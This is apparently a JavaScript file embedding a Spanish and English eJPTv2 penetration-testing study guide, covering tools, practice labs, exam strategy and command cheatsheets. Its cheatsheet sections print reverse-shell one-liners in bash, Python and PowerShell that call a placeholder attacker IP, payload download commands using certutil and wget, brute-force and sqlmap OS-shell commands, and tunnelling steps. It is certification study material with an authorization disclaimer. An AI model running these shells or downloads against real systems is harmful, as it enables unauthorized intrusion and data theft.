### 5.5 Post-Explotación

**LinPEAS / WinPEAS**
- **Uso**: Scripts que buscan vectores de escalado de privilegios automáticamente.
- **Consejo**: La salida es gigante. Aprende a leerla. Lo rojo/amarillo es lo importante. Ignora el ruido.

**Mimikatz**
- **Uso**: Extraer contraseñas en texto plano y hashes de la memoria de Windows.
- **Peligro**: Los antivirus lo odian. En eJPTv2 no hay AV, así que disfruta.

---

### 5.6 Resumen

No necesitas 100 herramientas. Necesitas dominar estas 10.
- **Red**: Nmap, Netcat.
- **Web**: Gobuster, Burp Suite.
- **Ataque**: Metasploit, Hydra.
- **Post**: PEAS, John/Hashcat.

Con esto, puedes hackear casi cualquier cosa en el nivel Junior/Mid.

[⬆️ Volver al inicio](README.md)`,

        "part6.md": `## Parte 6: Laboratorios Recomendados
 
 ### 6.1 La Práctica Hace al Maestro
 
 En lugar de darte soluciones paso a paso que copiarás sin pensar, te voy a recomendar **Laboratorios Reales** (gratuitos en su mayoría) que simulan perfectamente el entorno del eJPTv2.
 
 Tu misión: **Hackearlos sin mirar writeups** (al menos inténtalo 1 hora).
 
 ---
 
 ### 6.2 Nivel 1: Calentamiento (TryHackMe)
 
 #### [Blue](https://tryhackme.com/room/blue)
 - **Objetivo**: Explotar la vulnerabilidad más famosa de la historia (EternalBlue).
 - **Skills**: Nmap scripting, Metasploit, Windows.
 - **Reto**: Intenta hacerlo manual (sin Metasploit) después de hacerlo con MSF.
 
 #### [Ice](https://tryhackme.com/room/ice)
 - **Objetivo**: Explotar un servicio mal configurado en Windows.
 - **Skills**: RDP, Metasploit, Escalada de privilegios básica.
 
 ---
 
 ### 6.3 Nivel 2: La Realidad (TryHackMe)
 
 #### [Blaster](https://tryhackme.com/room/blaster)
 - **Objetivo**: Un entorno Windows moderno con IIS.
 - **Skills**: Enumeración web, Metasploit, Persistencia.
 
 #### [Ignite](https://tryhackme.com/room/ignite)
 - **Objetivo**: Un CMS vulnerable (Fuel CMS).
 - **Skills**: Searchsploit, RCE manual, Linux PrivEsc.
 
 ---
 
 ### 6.4 Nivel 3: Simulacro de Examen
 
 #### [Wreath](https://tryhackme.com/room/wreath) (Red Completa)
 - **Objetivo**: Esto es lo más parecido al eJPTv2. Una red con varias máquinas, pivoting y movimiento lateral.
 - **Skills**: Pivoting (Sshuttle/Proxychains), Evasión, Escalada compleja.
 - **Nota**: Es largo, pero vale oro.
 
 [⬆️ Volver al inicio](README.md)`,

        "part7.md": `## Parte 7: Sobreviviendo al Examen eJPTv2

### 7.1 No es un Examen, es un Trabajo

El eJPTv2 no te pide que respondas A, B o C. Te da una carta de contratación: "Aquí tienes una red corporativa. Hackéala y dime qué encontraste".

Tienes **48 horas**. Es tiempo de sobra. No entres en pánico.

---

### 7.2 Estrategia de Combate

#### Fase 1: El Mapeo (Horas 0-2)
No ataques nada. Solo mira.
- Lanza un Ping Sweep para ver todas las máquinas.
- Haz un diagrama (papel y boli). "La IP .10 es el servidor web, la .20 parece un controlador de dominio".
- **Objetivo**: Entender la red.

#### Fase 2: La Enumeración Profunda (Horas 2-10)
Elige la máquina más fácil (normalmente la que tiene más puertos abiertos o servicios web viejos).
- Enumera a muerte.
- Toma notas de TODO. "Puerto 80: Apache 2.4. Puerto 445: Windows 10".

#### Fase 3: El Ataque (Horas 10-...)
- ¿Encontraste un exploit para esa versión de Apache? Lánzalo.
- ¿Encontraste usuarios en SMB? Haz fuerza bruta al SSH.
- Si te atascas más de 1 hora en una máquina, **cámbiate a otra**. A veces necesitas información de la Máquina B para hackear la Máquina A.

---

### 7.3 Consejos Psicológicos

1.  **La Enumeración es la Clave**: Si no encuentras la vulnerabilidad, es porque no has enumerado bien. Vuelve a escanear. Busca puertos UDP. Busca en todos los puertos (1-65535).
2.  **Descansa**: Tu cerebro no funciona bien después de 8 horas seguidas. Duerme. Come. Sal a caminar. El examen dura 2 días.
3.  **Metasploit es tu Amigo**: Úsalo. No te dan puntos extra por hacerlo "a mano". Si hay un módulo de Metasploit, úsalo.
4.  **Las Preguntas son Pistas**: Lee las preguntas del examen. A veces te preguntan "¿Cuál es el contenido del archivo secret.txt en el escritorio de Administrator?". ¡Te están diciendo que el objetivo es llegar al escritorio de Administrator!

---

### 7.4 Lo que NO debes hacer

- **No te rindas**. Si te bloqueas, respira.
- **No compliques las cosas**. La solución suele ser sencilla. No busques un 0-day en el kernel si la contraseña del admin es "admin123".
- **No olvides las capturas de pantalla**. Necesitas pruebas.

[⬆️ Volver al inicio](README.md)`,

        "part8.md": `## Parte 8: Recursos y Despedida

### 8.1 Tu Mochila de Viaje

No vayas solo. Aquí tienes los recursos que yo uso día a día.

**Referencias Técnicas (La Biblia)**
- **[HackTricks](https://book.hacktricks.xyz/)**: Si existe una forma de hackearlo, está aquí. Es tu referencia #1.
- **[GTFOBins](https://gtfobins.github.io/)**: Para escalar privilegios en Linux.
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**: Cheatsheets para todo (SQLi, XSS, Reverse Shells).

**Entrenamiento (El Gimnasio)**
- **TryHackMe**: Empieza por aquí. Rutas guiadas. "Jr Penetration Tester" es oro puro.
- **HackTheBox**: Cuando te sientas valiente. Máquinas más reales y difíciles.

**Herramientas (El Taller)**
- **SecLists**: La mejor colección de diccionarios (usuarios, passwords, rutas web). \`apt install seclists\`.

---

### 8.2 Un Mensaje Final

Llegar hasta aquí demuestra que tienes la curiosidad y la disciplina necesarias. El hacking no es para gente que se rinde al primer error. Es para gente que ve un error y dice "¿Por qué pasó esto?" y sigue investigando.

Esta guía es un resumen de mi experiencia. Úsala, mejórala y, sobre todo, **compártela**. El conocimiento crece cuando se comparte.

Mucha suerte en tu examen. Nos vemos en el lado Root.

**- JotaTito05** 🏴‍☠️

[⬆️ Volver al inicio](README.md)`,

        "part9.md": `## Parte 9: La Biblia del eJPTv2 (Cheatsheet)

### 9.1 Host Discovery & Recon
#### Pasivo (OSINT)
\`\`\`bash
# Google Dorks
site:target.com filetype:pdf
intitle:"index of" "parent directory"

# TheHarvester
theHarvester -d domain.com -b google,bing,crtsh
\`\`\`

#### Activo (Nmap & Discovery)
\`\`\`bash
# Ping Sweep (Descubrimiento de Hosts)
nmap -sn 192.168.1.0/24

# Escaneo Rápido (Top 1000 TCP)
nmap -sS --min-rate 5000 -p- IP -oA nmap_fast

# Escaneo UDP (Top 20 - Vital para SNMP/TFTP)
nmap -sU --top-ports 20 IP -oA nmap_udp

# Escaneo Completo (Versiones + Scripts)
nmap -sC -sV -p 22,80,445 IP -oA nmap_full
\`\`\`

---

### 9.2 Service Enumeration (Protocolo a Protocolo)

#### FTP (21)
\`\`\`bash
# Login Anónimo
ftp IP # User: anonymous, Pass: anonymous
# Comandos FTP
binary # Activar modo binario (para exes/imágenes)
get archivo.txt
put shell.php
\`\`\`

#### SSH (22)
\`\`\`bash
# Banner Grabbing (Versiones antiguas?)
nc -vn IP 22
# Fuerza Bruta (Si tienes usuario)
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
\`\`\`

#### SMB (139/445)
\`\`\`bash
# Listar Shares (Sin credenciales)
smbclient -L //IP -N
enum4linux -a IP

# Conectar a un Share
smbclient //IP/share -N

# Descargar todo recursivamente
smbclient //IP/share -N -c 'prompt OFF; recurse ON; mget *'
\`\`\`

#### Web (80/443)
\`\`\`bash
# Fuzzing de Directorios (Gobuster)
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh

# Escaneo de CMS (WordPress)
wpscan --url http://IP --enumerate u,p,t --plugins-detection aggressive

# SQL Injection (SQLMap)
# 1. Listar Bases de Datos
sqlmap -u "http://IP/index.php?id=1" --dbs --batch
# 2. Obtener Shell (si eres DBA)
sqlmap -u "http://IP/index.php?id=1" --os-shell
\`\`\`

#### Bases de Datos
\`\`\`bash
# MySQL (3306)
mysql -h IP -u root -p

# Redis (6379)
redis-cli -h IP
> info
\`\`\`

---

### 9.3 Exploitation & Shells

#### Metasploit Framework
\`\`\`bash
# Inicialización
msfdb init && msfconsole

# Workspace (Organización)
workspace -a EJPT
db_nmap -sS -sV IP

# Búsqueda
search type:exploit name:eternalblue

# Configuración Payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
\`\`\`

#### Reverse Shells (One-Liners)
\`\`\`bash
# Bash
bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATACANTE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PowerShell (Base64 Encoded es mejor, pero este es el raw)
powershell -nop -c "$client = New-Object System.Net.Sockets.TcpClient('IP_ATACANTE',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
\`\`\`

#### Stabilize Shell (TTY)
\`\`\`bash
# 1. Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. Background
Ctrl + Z
# 3. Stty Magic
stty raw -echo; fg
export TERM=xterm
\`\`\`

---

### 9.4 Post-Exploitation & PrivEsc

#### Transferencia de Archivos
\`\`\`bash
# Servidor Python (Atacante)
python3 -m http.server 80

# Windows (Víctima)
certutil -urlcache -split -f http://IP_ATACANTE/file.exe C:\\Windows\\Temp\\file.exe

# Linux (Víctima)
wget http://IP_ATACANTE/linpeas.sh -O /tmp/linpeas.sh
\`\`\`

#### Linux PrivEsc
\`\`\`bash
# SUID Binaries
find / -perm -4000 -type f 2>/dev/null
# GTFOBins: https://gtfobins.github.io

# Crontabs
cat /etc/crontab

# Kernel
uname -a
\`\`\`

#### Windows PrivEsc
\`\`\`bash
# Privilegios
whoami /priv # SeImpersonate? -> JuicyPotato/PrintSpoofer

# Usuarios y Grupos
net user
net localgroup Administrators

# Red
ipconfig /all
route print
\`\`\`

---

### 9.5 Pivoting & Tunneling

#### Port Forwarding (SSH)
\`\`\`bash
# Local Port Forwarding (Traer puerto remoto a mi máquina)
# Acceder a un servicio interno (ej. 8080) a través del host comprometido
ssh -L 8080:127.0.0.1:8080 user@pivot-host

# Dynamic Port Forwarding (Proxy SOCKS)
ssh -D 1080 user@pivot-host
# Configurar /etc/proxychains.conf -> socks4 127.0.0.1 1080
proxychains nmap ...
\`\`\`

#### Chisel (Cuando no hay SSH)
\`\`\`bash
# Servidor (Atacante)
./chisel server -p 8000 --reverse

# Cliente (Víctima)
./chisel client IP_ATACANTE:8000 R:socks
\`\`\`

[⬆️ Volver al inicio](README.md)`,

        "appendices.md": `## Apéndices

### A. Cheatsheet de Comandos

**Reconocimiento**:
\`\`\`bash
# Nmap
nmap -sS -sV -p- IP -oA scan
nmap -A -T4 IP
nmap --script=vuln IP

# Gobuster
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Enum4linux
enum4linux -a IP

# theHarvester
theHarvester -d domain.com -b google,bing,crtsh
\`\`\`

**Explotación**:
\`\`\`bash
# SQLi
sqlmap -u "http://IP/page.php?id=1" --dbs
sqlmap -u "http://IP/page.php?id=1" -D db -T users --dump

# Metasploit
msfconsole
search exploit
use exploit/path
set RHOSTS IP
set LHOST IP
exploit

# Reverse shell
nc -lvnp 4444
bash -i >& /dev/tcp/IP/4444 0>&1
\`\`\`

**Escalado de Privilegios**:
\`\`\`bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
wget http://IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Windows
whoami /priv
systeminfo
certutil -urlcache -f http://IP/winpeas.exe winpeas.exe
winpeas.exe
\`\`\`

**Transferencia de Archivos**:
\`\`\`bash
# Servidor (atacante)
python3 -m http.server 8000

# Linux (víctima)
wget http://IP:8000/file
curl http://IP:8000/file -o file

# Windows (víctima)
certutil -urlcache -f http://IP:8000/file.exe file.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:8000/file.exe','file.exe')"
\`\`\`

### B. Tabla de Referencia de Puertos

| Puerto | Servicio | Descripción | Comandos de Enumeración |
|--------|----------|-------------|------------------------|
| 21 | FTP | File Transfer Protocol | \`ftp IP\`, \`nmap --script=ftp-anon -p 21 IP\` |
| 22 | SSH | Secure Shell | \`ssh user@IP\`, \`hydra -l user -P pass.txt ssh://IP\` |
| 23 | Telnet | Telnet | \`telnet IP\` |
| 25 | SMTP | Simple Mail Transfer | \`nc IP 25\`, \`smtp-user-enum -M VRFY -U users.txt -t IP\` |
| 53 | DNS | Domain Name System | \`dig @IP domain.com\`, \`dnsrecon -d domain.com\` |
| 80 | HTTP | Web Server | \`gobuster dir -u http://IP -w wordlist.txt\` |
| 110 | POP3 | Post Office Protocol | \`nc IP 110\` |
| 111 | RPCbind | RPC Bind | \`rpcinfo -p IP\` |
| 135 | MSRPC | Microsoft RPC | \`rpcclient -U "" IP\` |
| 139 | NetBIOS | NetBIOS Session | \`enum4linux -a IP\` |
| 143 | IMAP | Internet Message Access | \`nc IP 143\` |
| 161 | SNMP | Simple Network Management | \`snmpwalk -v 2c -c public IP\` |
| 389 | LDAP | Lightweight Directory | \`ldapsearch -x -h IP -b "dc=domain,dc=com"\` |
| 443 | HTTPS | HTTP Secure | \`gobuster dir -u https://IP -w wordlist.txt\` |
| 445 | SMB | Server Message Block | \`smbclient -L //IP -N\`, \`enum4linux -a IP\` |
| 1433 | MSSQL | Microsoft SQL Server | \`sqsh -S IP -U sa -P password\` |
| 2049 | NFS | Network File System | \`showmount -e IP\` |
| 3306 | MySQL | MySQL Database | \`mysql -h IP -u root -p\` |
| 3389 | RDP | Remote Desktop | \`xfreerdp /v:IP /u:user /p:pass\` |
| 5432 | PostgreSQL | PostgreSQL Database | \`psql -h IP -U postgres\` |
| 5900 | VNC | Virtual Network Computing | \`vncviewer IP\` |
| 6379 | Redis | Redis Database | \`redis-cli -h IP\` |
| 8080 | HTTP-Alt | Alternative HTTP | \`gobuster dir -u http://IP:8080 -w wordlist.txt\` |
| 27017 | MongoDB | MongoDB Database | \`mongo IP:27017\` |

---

## Notas Finales

**Versión**: 1.0  
**Última actualización**: 2024  
**Autor**: jotatito05  
**Licencia**: Compartido libremente para fines educativos

**Contribuciones**:
Si encuentras errores o quieres contribuir:
- Reporta issues
- Sugiere mejoras
- Comparte tu experiencia

**Agradecimientos**:
A toda la comunidad de ciberseguridad que comparte conocimiento libremente. Esta guía no sería posible sin:
- HackTheBox y TryHackMe por las plataformas de práctica
- Los creadores de herramientas open source
- Los bloggers y YouTubers que comparten writeups
- La comunidad de Reddit, Discord y Twitter

**Disclaimer**:
Esta guía es para fines educativos únicamente. El uso de estas técnicas sin autorización es ilegal. Siempre obtén permiso explícito antes de realizar pruebas de penetración.

---

**¡Buena suerte en tu examen eJPTv2!** 🎯

**- jotatito05**`
    }
};

// Clone content for EN and CA (Fallback to Spanish for untranslated parts)
notesData.en = {};
notesData.ca = {};

Object.keys(notesData.es).forEach(key => {
    // English Fallback
    notesData.en[key] = `> **⚠️ Translation in Progress**: This section is not yet fully translated. The Spanish version is shown below.\n\n---\n\n` + notesData.es[key];

    // Catalan Fallback
    notesData.ca[key] = `> **⚠️ Traducció en Curs**: Aquesta secció encara no està totalment traduïda. Es mostra la versió en castellà a continuació.\n\n---\n\n` + notesData.es[key];
});

// -------------------------------------------------------------------------
// ENGLISH TRANSLATIONS
// -------------------------------------------------------------------------

notesData.en["README.md"] = `# eJPTv2 Study Guide

## Table of Contents

- [Introduction](#introduction)
- [How to Use This Guide](#how-to-use-this-guide)
- [Part 1: Theoretical Fundamentals](part1.md)
  - [1.1 Network Fundamentals](part1.md)
  - [1.2 Essential Operating Systems](part1.md)
  - [1.3 Summary and Resources](part1.md)
- [Part 2: Reconnaissance & Enumeration](part2.md)
- [Part 3: Exploitation Techniques](part3.md)
- [Part 4: Post-Exploitation & Privilege Escalation](part4.md)
- [Part 5: Tools Reference](part5.md)
- [Part 6: Practical Exercises](part6.md)
- [Part 7: Exam Preparation](part7.md)
- [Part 8: Additional Resources](part8.md)
- [Part 9: Cheatsheet](part9.md)

---

## Introduction

Welcome to my eJPTv2 Study Guide! 👋

I'm **jotatito05** and these are the notes I created during my preparation for the eLearnSecurity Junior Penetration Tester version 2 (eJPTv2) exam. I decided to share them **voluntarily and for free** with the community because I firmly believe that cybersecurity knowledge should be accessible to everyone.

These notes are the result of hours of study, practice, and gathering information from multiple sources. I share them with the hope that they help you on your own path to eJPTv2 certification, just as other resources helped me.

### What will you find in this guide?

- **Solid Theoretical Fundamentals**: Networking concepts, protocols, and operating systems
- **Practical Techniques**: Reconnaissance, enumeration, exploitation, and post-exploitation
- **Essential Tools**: Detailed guides for the most important tools
- **Complete Exercises**: Step-by-step scenarios to practice
- **Exam Tips**: Strategies, tricks, and common mistakes to avoid
- **Additional Resources**: Links to documentation, practice platforms, and communities

### Why do I share these notes?

When I started studying for eJPTv2, I found a lot of scattered and sometimes confusing information. I decided to create my own organized notes and, once I saw how useful they were for me, I thought: "Why not share them with others who are on the same path?"

**My Philosophy**:
- **Accessible**: Clear language and step-by-step explanations (as I would have liked to find)
- **Practical**: Every concept comes with real examples that I have tested
- **Honest**: These are my personal notes, with my style and my way of understanding things
- **Collaborative**: If you find errors or want to contribute, you are welcome!

## How to Use This Guide

### For Beginners

If you are new to pentesting, we recommend following the guide in order:

1. **Start with the fundamentals** (Part 1): Make sure you understand networking and operating system concepts well
2. **Practice with tools** (Parts 2-3): Get familiar with basic reconnaissance and enumeration tools
3. **Advance to more complex techniques** (Parts 4-5): Privilege escalation and post-exploitation
4. **Practice with exercises** (Part 6): Apply everything learned in complete scenarios
5. **Prepare for the exam** (Part 7): Review specific tips and strategies

### For Experienced Users

If you already have basic knowledge:

- Use the **table of contents** to navigate directly to the topics you need to reinforce
- Focus on **practical exercises** (Part 6) to validate your knowledge
- Review the **tools reference** (Part 5) as a quick cheatsheet
- Consult **exam tips** (Part 7) for eJPTv2 specific strategies

### Study Tips

- **Practice actively**: Don't just read, execute the commands in a lab environment
- **Take notes**: Create your own personalized cheatsheet
- **Use practice platforms**: HackTheBox, TryHackMe, VulnHub
- **Join communities**: Share doubts and learn from others
- **Be patient with yourself**: We all learn at our own pace

### Formatting Conventions

Throughout this guide we will use:

**Code blocks** for commands:
\`\`\`bash
nmap -sV -sC 192.168.1.1
\`\`\`

**Output blocks** for outputs:
\`\`\`
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
\`\`\`

**Tables** for structured information:

| Port | Service | Description |
|------|---------|-------------|
| 22   | SSH     | Secure Shell |
| 80   | HTTP    | Web Server   |

**Lists** for steps or related concepts:
- First step
- Second step
- Third step

> **Important Note**: Boxes like this highlight key information

> **⚠️ Warning**: These boxes point out important precautions

> **💡 Tip**: These boxes offer tricks and best practices

### Practice Environment

To follow this guide you will need:

- **Operating System**: Linux (preferably Kali Linux or Parrot OS)
- **Virtual Machines**: VirtualBox or VMware to create labs
- **Online Platforms**: Accounts on HackTheBox, TryHackMe or similar
- **Tools**: Most come pre-installed in Kali Linux

> **💡 Tip**: If you cannot install Linux, you can use Windows with WSL2 (Windows Subsystem for Linux) or a virtual machine.

### Ethics and Legality

> **⚠️ IMPORTANT**: The techniques described in these notes are for educational purposes and must be used ONLY on:
> - Your own systems
> - Controlled lab environments
> - Authorized practice platforms (HackTheBox, TryHackMe, etc.)
> - Systems where you have explicit written permission
>
> The unauthorized use of these techniques is **illegal** and can have serious consequences. I share this knowledge with the confidence that you will use it ethically and responsibly.

### Acknowledgments and Contributions

These notes are possible thanks to the cybersecurity community that shares knowledge freely. If you find this material useful:

- ⭐ Star the repository
- 🐛 Report errors or suggest improvements
- 🤝 Share it with others who are studying
- 💬 Join the community and help others

**Credits**: These notes compile information from multiple public sources, official documentation, and my personal experience. If you recognize content that should be specifically credited, please let me know.

---

You are ready to start your journey towards eJPTv2 certification! Remember: every expert was once a beginner. With dedication and practice, you can achieve it too.

**- jotatito05** 🚀`;

notesData.en["part9.md"] = `## Part 9: The eJPTv2 Bible (Cheatsheet)

### 9.1 Host Discovery & Recon
#### Passive (OSINT)
\`\`\`bash
# Google Dorks
site:target.com filetype:pdf
intitle:"index of" "parent directory"

# TheHarvester
theHarvester -d domain.com -b google,bing,crtsh
\`\`\`

#### Active (Nmap & Discovery)
\`\`\`bash
# Ping Sweep (Host Discovery)
nmap -sn 192.168.1.0/24

# Fast Scan (Top 1000 TCP)
nmap -sS --min-rate 5000 -p- IP -oA nmap_fast

# UDP Scan (Top 20 - Vital for SNMP/TFTP)
nmap -sU --top-ports 20 IP -oA nmap_udp

# Full Scan (Versions + Scripts)
nmap -sC -sV -p 22,80,445 IP -oA nmap_full
\`\`\`

---

### 9.2 Service Enumeration

#### FTP (21)
\`\`\`bash
# Anonymous Login
ftp IP # User: anonymous, Pass: anonymous
# FTP Commands
binary # Enable binary mode
get file.txt
put shell.php
\`\`\`

#### SSH (22)
\`\`\`bash
# Banner Grabbing
nc -vn IP 22
# Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
\`\`\`

#### SMB (139/445)
\`\`\`bash
# List Shares
smbclient -L //IP -N
enum4linux -a IP

# Connect to Share
smbclient //IP/share -N

# Recursive Download
smbclient //IP/share -N -c 'prompt OFF; recurse ON; mget *'
\`\`\`

#### Web (80/443)
\`\`\`bash
# Directory Fuzzing
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh

# CMS Scan (WordPress)
wpscan --url http://IP --enumerate u,p,t --plugins-detection aggressive

# SQL Injection (SQLMap)
sqlmap -u "http://IP/index.php?id=1" --dbs --batch
sqlmap -u "http://IP/index.php?id=1" --os-shell
\`\`\`

---

### 9.3 Exploitation & Shells

#### Metasploit Framework
\`\`\`bash
# Init
msfdb init && msfconsole
workspace -a EJPT

# Search & Exploit
search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP
set LHOST tun0
exploit
\`\`\`

#### Reverse Shells
\`\`\`bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
\`\`\`

#### Stabilize Shell
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
\`\`\`

---

### 9.4 Post-Exploitation

#### File Transfer
\`\`\`bash
# Python Server
python3 -m http.server 80

# Windows Download
certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\\Windows\\Temp\\file.exe

# Linux Download
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
\`\`\`

#### PrivEsc
\`\`\`bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null

# Windows
whoami /priv
net user
\`\`\`

[⬆️ Back to Top](README.md)`;

notesData.en["part1.md"] = `## Part 1: Theoretical Fundamentals

### 1.1 Introduction: The Hacker's Foundation

Before launching your first exploit or scanning a network, you need to understand **where you are stepping**. Many beginners want to skip this part and go straight to "hacking", but I assure you: **the best hackers are, first and foremost, network and systems experts**.

If you don't understand how a data packet travels, you won't understand how to intercept it. If you don't know how Linux handles permissions, you won't know how to escalate privileges.

In this section, I won't bore you with useless academic theory. We are going to see **what you really need to know** for the exam and for real life.

---

### 1.2 Network Fundamentals

#### The Map of the Territory: OSI and TCP/IP Models

Imagine the network is a postal system. For a letter (data) to get from your house (source) to the office (destination), many "invisible" things happen. The OSI and TCP/IP models are simply maps that explain those steps.

**Why does this matter to you as a pentester?**
Because every attack happens at a specific "layer". If you understand the layer, you understand the attack.

| Layer | What happens here | Typical Attacks |
|-------|-------------------|-----------------|
| **Application** (7) | What you see (Browser, SSH) | SQL Injection, XSS, RCE |
| **Presentation** (6) | Data translation (Formats, Encryption) | SSL Stripping, Malformed Data |
| **Session** (5) | Dialogue control (Who speaks) | Session Hijacking |
| **Transport** (4) | How it's sent (TCP/UDP) | Port Scanning, DoS |
| **Network** (3) | Where it goes (IP, Routes) | IP Spoofing, Man-in-the-Middle |
| **Link** (2) | Physical local connection (MAC) | ARP Poisoning, MAC Flooding |
| **Physical** (1) | Cables and signals (Bits) | Sniffing (physical), Jamming |

> **💡 Key Concept**: 
> - **TCP** is like a phone call: "Hello, can you hear me?", "Yes, I hear you", "Okay, I'll tell you...". It's reliable.
> - **UDP** is like sending a letter: You drop it in the mailbox and hope it arrives. It's fast, but delivery isn't guaranteed.
> - For scanning (Nmap), this is vital. A TCP scan connects; a UDP scan "fires and listens".

#### The Language of Networks: Essential Protocols

Protocols are the languages machines speak. As a pentester, you are a translator (and sometimes, a liar pretending to be someone else).

Here are the "languages" you will encounter most in eJPTv2:

**1. The Web (HTTP/HTTPS)**
- **Ports**: 80 (HTTP), 443 (HTTPS)
- **Your goal**: Look for login panels, hidden directories, default configurations.
- **Note**: HTTPS encrypts traffic, but DOES NOT protect the server from web attacks (SQLi, XSS still work the same).

**2. File Transfer (FTP/TFTP)**
- **Ports**: 21 (FTP), 69 (TFTP)
- **The classic**: "Anonymous Login". Admins often forget to close anonymous access. Always try it!
- **Danger**: FTP sends passwords in plain text. If you are sniffing the network (Wireshark), bingo!

**3. Remote Administration (SSH/Telnet/RDP)**
- **SSH (22)**: Secure, but vulnerable to brute force or stolen private keys.
- **Telnet (23)**: The dinosaur. Everything goes in plain text. If you see it, smile.
- **RDP (3389)**: Windows Remote Desktop. Vulnerable to brute force and sometimes critical exploits (BlueKeep).

**4. File Sharing (SMB)**
- **Ports**: 139, 445
- **The King of Windows**: SMB is critical. This is where worms (WannaCry) and the juiciest enumerations live.
- **Your goal**: List shared folders (shares), users, and look for the famous "EternalBlue".

#### IP Addressing: Where are the targets?

You don't need to be a mathematician, but you need to know how to read an IP and a subnet mask to know **how big the network you are attacking is**.

**The Quick Cheat Sheet (CIDR):**
- **/24** (e.g., 192.168.1.0/24) -> Typical home network. **254** possible victims.
- **/16** (e.g., 10.0.0.0/16) -> Medium corporate network. **65,534** possible victims.
- **/8** (e.g., 10.0.0.0/8) -> Giant network. Millions of IPs.

> **⚠️ Exam Tip**: If you are given an IP like \`172.16.5.10/24\`, your first step is to discover **who else is on that network**. A "Ping Sweep" will tell you which other neighbors are alive.

---

### 1.3 Operating Systems: Your Workspace

As a pentester, you are an amphibian. You need to survive on both land (Windows) and water (Linux).

#### Linux: The Hacker's Home

Almost all your tools run here (Kali, Parrot), and many servers you will attack are Linux.

**What you MUST master:**
1.  **Permissions (\`chmod\`, \`chown\`)**:
    - \`rwx\`: Read, Write, Execute.
    - If you see a file with "weird" permissions (e.g., SUID), it could be your ticket to being root.
2.  **Processes (\`ps aux\`)**:
    - Knowing what is running tells you what the server does. Is there a web server? A database?
3.  **Network (\`ip addr\`, \`netstat\`)**:
    - Who is this machine talking to? \`netstat -tulpn\` is your best friend to see locally open ports.

#### Windows: The Corporate Target

The business world runs on Windows. Attacking it requires understanding its logic.

**Key Concepts:**
1.  **The Registry**: It's the brain of Windows. It contains configurations, saved passwords, and persistence points.
2.  **Users and Groups**:
    - \`Administrator\`: God.
    - \`SYSTEM\`: More than God (the operating system itself). Your final goal.
3.  **CMD vs PowerShell**:
    - CMD is basic. PowerShell is **powerful**. With PowerShell you can interact with the entire operating system, download files, and execute complex scripts in memory.

---

### 1.4 Summary and Next Steps

Don't get overwhelmed memorizing ports right now. The important thing is that you understand the logic:
- Networks connect things.
- Protocols are languages.
- Operating systems manage resources.

We, as pentesters, look for **flaws** in that logic, in those languages, and in that management.

**Ready?** In the next part, we will leave theory behind and start "touching" the network. Let's see how to discover what's on the other side of the cable.

[⬆️ Back to Top](README.md)`;

notesData.en["part2.md"] = `## Part 2: Reconnaissance & Enumeration

### 2.1 The Most Important Phase

I'll say it clearly: **If you fail here, you fail everywhere**.

80% of success in a pentest (and in the eJPTv2 exam) depends on how well you enumerate. Many beginners launch a quick scan, see port 80, and run to look for web vulnerabilities, ignoring that there was an open port 445 (SMB) with administrator access.

**Your mantra**: "Enumerate until it hurts, and then enumerate a little more."

---

### 2.2 Passive Reconnaissance (OSINT)

Before "touching" the target, let's see what the internet says about it. This is like investigating someone on social media before a date.

**Tools you must know:**

1.  **Google Dorks**:
    - It's not just searching. It's searching with surgery.
    - \`site:company.com filetype:pdf\` -> Do they have public manuals with default passwords?
    - \`inurl:admin\` -> Exposed admin panels?

2.  **TheHarvester & Shodan**:
    - **TheHarvester**: Collects emails and subdomains. Emails give you the user format (e.g., j.doe@company.com), vital for brute force attacks later.
    - **Shodan**: The "Hacker's Google". It tells you what technology the server uses without you sending a single packet.

---

### 2.3 Active Reconnaissance: Nmap is your God

Nmap is not a tool, it's an extension of your body. You have to know how to use it in your sleep.

#### My Scanning Methodology (Battle Tested)

Don't launch a scan wildly. Follow this order to not waste time:

**Step 1: Who is alive? (Ping Sweep)**
\`\`\`bash
nmap -sn 192.168.1.0/24
\`\`\`
*Translation*: "Hello network, who is awake?". This gives you the list of target IPs.

**Step 2: The Fast Scan (Top 1000 ports)**
\`\`\`bash
nmap -sS --min-rate 5000 -p- 192.168.1.100
\`\`\`
